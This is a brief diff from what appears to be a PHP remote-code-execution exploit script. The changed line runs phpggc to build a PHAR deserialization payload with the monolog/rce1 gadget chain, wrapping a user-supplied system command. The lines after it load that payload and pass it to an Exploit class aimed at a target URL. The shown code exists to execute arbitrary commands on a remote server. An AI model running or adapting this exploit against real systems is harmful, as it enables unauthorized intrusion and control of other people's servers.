@@ -128,7 +128,7 @@ class Exploit:
 
 
 def main(url, command):
-    os.system(f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system {command}")    
+    os.system(f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system \"{command}\"")
     payload = open('./exploit.phar', 'rb').read()
     exploit = Exploit(url.rstrip('/'), payload, None)
     exploit.main()
